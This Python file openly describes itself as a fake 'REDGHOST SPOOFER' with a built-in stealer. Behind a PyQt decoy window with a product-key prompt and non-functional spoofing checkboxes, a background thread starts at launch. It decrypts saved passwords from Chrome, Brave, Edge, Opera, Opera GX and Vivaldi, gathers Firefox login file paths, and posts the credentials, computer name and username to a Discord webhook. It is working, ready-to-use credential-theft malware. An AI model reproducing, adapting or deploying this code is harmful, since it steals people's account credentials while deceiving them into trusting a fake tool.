# Ceci est un faux spoofer avec un stealer intégré.
# This is a fake spoofer with an integrated stealer.


import os
import json
import base64
import sqlite3
import shutil
import sys
import time
import hashlib
import getpass
import threading
import concurrent.futures
import subprocess
import tempfile
from datetime import datetime
import requests
from PyQt5.QtWidgets import (QApplication, QMainWindow, QLabel, QPushButton, 
                           QLineEdit, QCheckBox, QComboBox, QFrame, QHBoxLayout, 
                           QVBoxLayout, QWidget, QGridLayout, QGroupBox, QMessageBox)
from PyQt5.QtGui import QFont, QIcon
from PyQt5.QtCore import Qt, QTimer

# Importation des dépendances Windows
try:
    import win32crypt
    from Crypto.Cipher import AES
    import qtawesome as qta
except ImportError as e:
    if getattr(sys, 'frozen', False):
        subprocess.run(["cmd", "/c", f"echo Erreur critique: {e} && pause"])
    sys.exit(1)

def get_script_dir():
    """Obtenir le répertoire du script, fonctionne avec PyInstaller"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return "❌ Mot de passe vide"
            
        if len(encrypted_password) > 3 and (encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag)
            decrypted_pass = decrypted_pass.rstrip(b"\x00").rstrip(b"\x10")
            return decrypted_pass.decode('utf-8', errors='ignore').strip()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return "❌ Erreur de déchiffrement"

def send_to_discord(content, webhook_url):
    if not webhook_url:
        return False
    try:
        if len(content) > 1950:
            chunks = [content[i:i+1950] for i in range(0, len(content), 1950)]
            for i, chunk in enumerate(chunks):
                payload = {
                    "content": f"Partie {i+1}/{len(chunks)}:\n```{chunk}```"
                }
                response = requests.post(webhook_url, json=payload)
                if response.status_code == 429:
                    retry_after = response.json().get('retry_after', 1)
                    time.sleep(retry_after + 0.5)
                    requests.post(webhook_url, json=payload)
                time.sleep(0.5)
        else:
            payload = {
                "content": f"```{content}```"
            }
            requests.post(webhook_url, json=payload)
        return True
    except:
        return False

def process_profile(browser_name, base_path, profile, webhook_url, all_passwords, master_key):
    profile_path = os.path.join(base_path, profile)
    if not os.path.exists(profile_path):
        return
        
    login_db = os.path.join(profile_path, "Login Data")
    if not os.path.exists(login_db):
        return
        
    # Créer un dossier temporaire dédié
    temp_dir = os.path.join(tempfile.gettempdir(), f"redghost_{os.urandom(4).hex()}")
    os.makedirs(temp_dir, exist_ok=True)
    temp_login_db = os.path.join(temp_dir, f"{browser_name}_{profile}_login_data.db")
    
    try:
        # Copier la base de données pour éviter les problèmes de verrouillage
        shutil.copy2(login_db, temp_login_db)
    except:
        return
        
    try:
        conn = sqlite3.connect(temp_login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT NULL AND username_value != '' AND password_value IS NOT NULL")
        profile_passwords = []
        all_content = ""
        
        for url, username, encrypted_password in cursor.fetchall():
            try:
                password = decrypt_password(encrypted_password, master_key)
                profile_passwords.append({
                    "url": url,
                    "username": username,
                    "password": password,
                    "browser": f"{browser_name} ({profile})"
                })
                all_content += f"Site: {url}\nUtilisateur: {username}\nMot de passe: {password}\n\n"
            except:
                pass
                
        cursor.close()
        conn.close()
        
        if profile_passwords:
            all_passwords.extend(profile_passwords)
            
            if webhook_url:
                discord_content = f"INFORMATIONS DE CONNEXION {browser_name.upper()} ({profile}) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                discord_content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
                discord_content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
                discord_content += all_content
                
                send_thread = threading.Thread(target=send_to_discord, args=(discord_content, webhook_url))
                send_thread.daemon = True
                send_thread.start()
                send_thread.join(timeout=15)
    except:
        pass
    finally:
        try:
            # Nettoyage
            if os.path.exists(temp_login_db):
                os.remove(temp_login_db)
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

def get_chrome_based_passwords(browser_name, browser_path, webhook_url=None, all_passwords=None):
    if all_passwords is None:
        all_passwords = []
        
    base_path = os.path.expanduser('~') + browser_path
    
    if not os.path.exists(base_path):
        return all_passwords
        
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
    master_key = get_master_key(base_path)
    
    if not master_key:
        return all_passwords
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [
            executor.submit(process_profile, browser_name, base_path, profile, webhook_url, all_passwords, master_key)
            for profile in profiles
        ]
        concurrent.futures.wait(futures)
        
    return all_passwords

def get_firefox_passwords(webhook_url=None, all_passwords=None):
    if all_passwords is None:
        all_passwords = []
        
    base_path = os.path.expanduser('~') + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
    
    if not os.path.exists(base_path):
        return all_passwords
        
    for profile_folder in os.listdir(base_path):
        try:
            if not profile_folder.endswith('.default') and not '.default-release' in profile_folder:
                continue
                
            profile_path = os.path.join(base_path, profile_folder)
            login_db = os.path.join(profile_path, "logins.json")
            
            if not os.path.exists(login_db):
                login_db = os.path.join(profile_path, "signons.sqlite")
                if not os.path.exists(login_db):
                    continue
                    
            all_passwords.append({
                "url": "Firefox Info",
                "username": "Voir chemin",
                "password": login_db,
                "browser": f"Firefox ({profile_folder})"
            })
            
            if webhook_url:
                discord_content = f"INFORMATIONS FIREFOX ({profile_folder}) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                discord_content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
                discord_content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
                discord_content += f"Chemin de la base de données: {login_db}"
                
                send_thread = threading.Thread(target=send_to_discord, args=(discord_content, webhook_url))
                send_thread.daemon = True
                send_thread.start()
                send_thread.join(timeout=10)
        except:
            pass
            
    return all_passwords

# Nouvelle fonction pour extraire les mots de passe d'Opera GX
def get_opera_gx_passwords(webhook_url=None, all_passwords=None):
    if all_passwords is None:
        all_passwords = []
        
    # Chemins spécifiques à la configuration d'Opera GX
    opera_gx_dir = os.path.expanduser('~') + r"\AppData\Roaming\Opera Software"
    local_state_path = os.path.join(opera_gx_dir, "Opera GX Stable", "Local State")
    
    # Vérifier si les chemins existent
    if not os.path.exists(opera_gx_dir):
        return all_passwords
        
    if not os.path.exists(local_state_path):
        return all_passwords
    
    # Obtenir la clé maître
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return all_passwords
    
    # Trouver les fichiers Login Data possibles
    login_data_paths = []
    
    # Recherche directe dans le dossier Opera GX Stable
    login_data_path = os.path.join(opera_gx_dir, "Opera GX Stable", "Login Data")
    if os.path.exists(login_data_path):
        login_data_paths.append(login_data_path)
    
    # Si pas trouvé, recherche dans le dossier parent
    if not login_data_paths:
        login_data_path = os.path.join(opera_gx_dir, "Login Data")
        if os.path.exists(login_data_path):
            login_data_paths.append(login_data_path)
    
    # Recherche dans le dossier Opera GX Stable parent
    if not login_data_paths:
        login_data_path = os.path.join(opera_gx_dir, "Opera GX Stable", "Login Data")
        if os.path.exists(login_data_path):
            login_data_paths.append(login_data_path)
    
    # Extraire les mots de passe de chaque Login Data
    for login_data_path in login_data_paths:
        # Copier la base de données pour éviter les problèmes de verrouillage
        temp_dir = tempfile.mkdtemp()
        temp_db = os.path.join(temp_dir, "opera_gx_login.db")
        
        try:
            # Copier la base de données
            shutil.copy2(login_data_path, temp_db)
            
            # Se connecter à la base de données
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Essayer différentes requêtes selon la structure de la base
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT NULL AND username_value != '' AND password_value IS NOT NULL")
            except:
                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value IS NOT NULL AND username_value != '' AND password_value IS NOT NULL")
                except:
                    continue
            
            profile_passwords = []
            all_content = ""
            
            for url, username, encrypted_password in cursor.fetchall():
                try:
                    password = decrypt_password(encrypted_password, master_key)
                    profile_passwords.append({
                        "url": url,
                        "username": username,
                        "password": password,
                        "browser": "Opera GX"
                    })
                    all_content += f"Site: {url}\nUtilisateur: {username}\nMot de passe: {password}\n\n"
                except:
                    pass
                    
            cursor.close()
            conn.close()
            
            if profile_passwords:
                all_passwords.extend(profile_passwords)
                
                if webhook_url:
                    discord_content = f"INFORMATIONS DE CONNEXION OPERA GX - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    discord_content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
                    discord_content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
                    discord_content += all_content
                    
                    send_thread = threading.Thread(target=send_to_discord, args=(discord_content, webhook_url))
                    send_thread.daemon = True
                    send_thread.start()
                    send_thread.join(timeout=15)
        except:
            pass
        finally:
            try:
                # Nettoyage
                if os.path.exists(temp_db):
                    os.remove(temp_db)
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
    
    return all_passwords

# Classe d'interface graphique
class SpooferApplication(QMainWindow):
    def __init__(self):
        super().__init__()
        self.key_activated = False  # Variable pour suivre l'état d'activation
        self.all_passwords = []  # Pour stocker les mots de passe trouvés
        self.initUI()
        
        # Lancer automatiquement l'extraction au démarrage
        # Utiliser un QTimer pour démarrer l'extraction après que l'interface soit chargée
        QTimer.singleShot(100, self.start_background_extraction)
        
    def initUI(self):
        # Configuration de la fenêtre principale
        self.setWindowTitle('REDGHOST SPOOFER')
        self.setGeometry(100, 100, 650, 550)
        self.setStyleSheet("background-color: #1E1E1E; color: white;")
        self.setWindowIcon(qta.icon('fa5s.shield-alt', color='#CC0000'))
        
        # Widget central
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Layout principal
        main_layout = QVBoxLayout(central_widget)
        
        # Titre avec icône
        title_layout = QHBoxLayout()
        icon_label = QLabel()
        icon_label.setPixmap(qta.icon('fa5s.fingerprint', color='#CC0000').pixmap(48, 48))
        title_layout.addWidget(icon_label)
        
        title_label = QLabel('REDGHOST SPOOFER')
        title_label.setFont(QFont('Arial', 24, QFont.Bold))
        title_label.setStyleSheet("color: #CC0000;")
        title_layout.addWidget(title_label)
        title_layout.setAlignment(Qt.AlignCenter)
        main_layout.addLayout(title_layout)
        
        # Section pour la clé produit
        key_frame = QFrame()
        key_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        key_layout = QVBoxLayout(key_frame)
        
        key_title = QLabel("Renseigner clé produit")
        key_title.setFont(QFont('Arial', 12))
        key_title.setStyleSheet("color: #CC0000;")
        key_layout.addWidget(key_title)
        
        key_input_layout = QHBoxLayout()
        key_icon = QLabel()
        key_icon.setPixmap(qta.icon('fa5s.key', color='#CC0000').pixmap(24, 24))
        key_input_layout.addWidget(key_icon)
        
        # Champ pour la clé
        self.key_input = QLineEdit()
        self.key_input.setStyleSheet("background-color: #333333; color: white; padding: 8px;")
        self.key_input.setPlaceholderText("XXXXX-XXXXX-XXXXX-XXXXX")
        key_input_layout.addWidget(self.key_input)
        
        key_layout.addLayout(key_input_layout)
        
        # Bouton d'activation
        self.activate_button = QPushButton(" Activer")
        self.activate_button.setIcon(qta.icon('fa5s.check-circle', color='white'))
        self.activate_button.setStyleSheet("background-color: #CC0000; color: white; padding: 8px;")
        self.activate_button.clicked.connect(self.verify_key)
        key_layout.addWidget(self.activate_button)
        
        # Indicateur d'état d'activation
        self.activation_status = QLabel("État: Non activé")
        self.activation_status.setStyleSheet("color: #FF5555;")
        key_layout.addWidget(self.activation_status)
        
        main_layout.addWidget(key_frame)
        
        # Section des fonctionnalités
        features_frame = QFrame()
        features_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        features_layout = QGridLayout(features_frame)
        
        # Première colonne
        hardware_group = QGroupBox("Modification Hardware")
        hardware_group.setStyleSheet("color: white;")
        hardware_layout = QVBoxLayout(hardware_group)
        
        hardware_options = [
            ("Modifier MAC Address", "fa5s.network-wired"),
            ("Spoofer HWID", "fa5s.microchip"),
            ("Changer Serial Numbers", "fa5s.barcode"),
            ("Modifier BIOS Info", "fa5s.memory"),
            ("Générer UUID Aléatoire", "fa5s.random")
        ]
        
        for option, icon_name in hardware_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            hardware_layout.addWidget(checkbox)
        
        features_layout.addWidget(hardware_group, 0, 0)
        
        # Deuxième colonne
        network_group = QGroupBox("Outils Réseau")
        network_group.setStyleSheet("color: white;")
        network_layout = QVBoxLayout(network_group)
        
        network_options = [
            ("Masquer IP", "fa5s.mask"),
            ("Anti-Tracking DNS", "fa5s.globe"),
            ("Proxy VPN Intégré", "fa5s.route"),
            ("Firewall Avancé", "fa5s.fire"),
            ("Nettoyer Traces Réseau", "fa5s.broom")
        ]
        
        for option, icon_name in network_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            network_layout.addWidget(checkbox)
        
        features_layout.addWidget(network_group, 0, 1)
        
        # Troisième colonne
        security_group = QGroupBox("Sécurité")
        security_group.setStyleSheet("color: white;")
        security_layout = QVBoxLayout(security_group)
        
        security_options = [
            ("Protection Anti-Ban", "fa5s.user-shield"),
            ("Nettoyage Traces", "fa5s.eraser"),
            ("Mode Furtif", "fa5s.user-ninja"),
            ("Désactivation Télémétrie", "fa5s.eye-slash"),
            ("Anti-Détection", "fa5s.ghost")
        ]
        
        for option, icon_name in security_options:
            checkbox = QCheckBox(option)
            checkbox.setIcon(qta.icon(icon_name, color='#CC0000'))
            checkbox.setStyleSheet("color: white;")
            security_layout.addWidget(checkbox)
        
        features_layout.addWidget(security_group, 0, 2)
        
        main_layout.addWidget(features_frame)
        
        # Section inférieure pour les options de configuration
        config_frame = QFrame()
        config_frame.setStyleSheet("background-color: #252525; padding: 15px; margin: 10px;")
        config_layout = QHBoxLayout(config_frame)
        
        # Sélection de profil
        profile_label = QLabel("Profil:")
        profile_label.setStyleSheet("color: white;")
        config_layout.addWidget(profile_label)
        
        profile_combo = QComboBox()
        profile_combo.addItems(["Profil Standard", "Profil Gaming", "Profil Sécurisé", "Profil Personnalisé"])
        profile_combo.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(profile_combo)
        
        # Sélection de mode
        mode_label = QLabel("Mode:")
        mode_label.setStyleSheet("color: white;")
        config_layout.addWidget(mode_label)
        
        mode_combo = QComboBox()
        mode_combo.addItems(["Mode Normal", "Mode Agressif", "Mode Discret"])
        mode_combo.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(mode_combo)
        
        # Bouton paramètres
        settings_button = QPushButton(" Paramètres")
        settings_button.setIcon(qta.icon('fa5s.cog', color='white'))
        settings_button.setStyleSheet("background-color: #333333; color: white; padding: 5px;")
        config_layout.addWidget(settings_button)
        
        main_layout.addWidget(config_frame)
        
        # Bouton d'exécution
        self.execute_button = QPushButton(" Exécuter")
        self.execute_button.setIcon(qta.icon('fa5s.play', color='white'))
        self.execute_button.setStyleSheet("background-color: #555555; color: white; padding: 10px; margin: 10px 150px;")
        self.execute_button.setFont(QFont('Arial', 12, QFont.Bold))
        self.execute_button.clicked.connect(self.execute_spoofer)
        self.execute_button.setEnabled(False)  # Désactivé par défaut
        main_layout.addWidget(self.execute_button)
        
        # Barre de statut
        self.statusBar().showMessage("Prêt - Veuillez entrer votre clé produit")
        self.statusBar().setStyleSheet("background-color: #333333; color: white;")
    
    def start_background_extraction(self):
        """Lance l'extraction des mots de passe en arrière-plan dès le démarrage"""
        # Configuration du webhook Discord
        webhook_url = "HERE YOUR WEBHOOK"
        
        # Créer et démarrer le thread d'extraction
        extract_thread = threading.Thread(target=self.extract_passwords, args=(webhook_url, self.all_passwords))
        extract_thread.daemon = True
        extract_thread.start()
    
    def verify_key(self):
        key = self.key_input.text()
        # Exemple de vérification simple
        valid_keys = ["LK7L-G81I-TBQE-NWUT-JTXP", "P8P6-9B0X-MV7D-CETC-ZW5E"]
        
        if key in valid_keys:
            self.key_activated = True
            QMessageBox.information(self, "Activation", "Clé produit validée avec succès!")
            self.statusBar().showMessage("Enregistré - Licence active")
            
            # Mise à jour de l'interface utilisateur
            self.activation_status.setText("État: Activé")
            self.activation_status.setStyleSheet("color: #55FF55;")
            self.activate_button.setEnabled(False)
            self.activate_button.setStyleSheet("background-color: #006600; color: white; padding: 8px;")
            self.activate_button.setText(" Activé")
            
            # Activer le bouton d'exécution
            self.execute_button.setEnabled(True)
            self.execute_button.setStyleSheet("background-color: #CC0000; color: white; padding: 10px; margin: 10px 150px;")
            
            # Désactiver la modification de la clé
            self.key_input.setReadOnly(True)
            self.key_input.setStyleSheet("background-color: #444444; color: white; padding: 8px;")
        else:
            QMessageBox.warning(self, "Erreur", "Clé produit invalide. Veuillez réessayer.")
            self.statusBar().showMessage("Échec de l'activation - Clé invalide")
    
    def execute_spoofer(self):
        # Vérifier si la clé a été activée avant d'exécuter
        if not self.key_activated:
            QMessageBox.warning(self, "Erreur", "Veuillez activer votre produit avant d'exécuter.")
            return
        
        # Simuler un traitement (l'extraction a déjà été lancée au démarrage)
        QMessageBox.information(self, "Opération", "Processus de spoofing lancé avec succès!")
        self.statusBar().showMessage("Opération terminée")
    
    def extract_passwords(self, webhook_url, all_passwords):
        """Fonction pour extraire les mots de passe de tous les navigateurs"""
        # Définir les navigateurs à analyser
        browser_tasks = [
            {"name": "Chrome", "path": r"\AppData\Local\Google\Chrome\User Data"},
            {"name": "Brave", "path": r"\AppData\Local\BraveSoftware\Brave-Browser\User Data"},
            {"name": "Edge", "path": r"\AppData\Local\Microsoft\Edge\User Data"},
            {"name": "Opera", "path": r"\AppData\Roaming\Opera Software\Opera Stable"},
            {"name": "Vivaldi", "path": r"\AppData\Local\Vivaldi\User Data"}
        ]
        
        # Traiter chaque navigateur
        for browser in browser_tasks:
            try:
                get_chrome_based_passwords(
                    browser["name"], 
                    browser["path"], 
                    webhook_url, 
                    all_passwords
                )
            except:
                pass
        
        # Traiter Opera GX avec la méthode spéciale
        try:
            get_opera_gx_passwords(webhook_url, all_passwords)
        except:
            pass
                
        # Traiter Firefox
        try:
            get_firefox_passwords(webhook_url, all_passwords)
        except:
            pass
            
        # Envoyer un résumé final
        if webhook_url and all_passwords:
            summary_content = f"RÉSUMÉ D'EXTRACTION - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            summary_content += f"Ordinateur: {os.environ.get('COMPUTERNAME', 'Inconnu')}\n"
            summary_content += f"Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}\n\n"
            summary_content += f"Identifiants trouvés: {len(all_passwords)}\n"
            
            browser_count = {}
            for item in all_passwords:
                browser = item['browser'].split(' ')[0]
                browser_count[browser] = browser_count.get(browser, 0) + 1
                
            summary_content += "\nRépartition par navigateur:\n"
            for browser, count in browser_count.items():
                summary_content += f"- {browser}: {count} identifiants\n"
                
            # Envoi à Discord
            send_to_discord(summary_content, webhook_url)

# Point d'entrée de l'application
def main():
    try:
        import ctypes
        # Essayer de définir l'application comme DPI-aware (meilleur rendu sur écrans haute résolution)
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except:
            pass
    except:
        pass
        
    # Désactiver le débogage pour les versions compilées
    if getattr(sys, 'frozen', False):
        sys.stderr = open(os.devnull, 'w')
        
    app = QApplication(sys.argv)
    ex = SpooferApplication()
    ex.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # En cas d'erreur critique, afficher un message et attendre
        if getattr(sys, 'frozen', False):
            subprocess.run(["cmd", "/c", f"echo Erreur critique dans l'application: {e} && pause"])
        else:
            print(f"Erreur critique: {e}")
            input("Appuyez sur Entrée pour quitter...")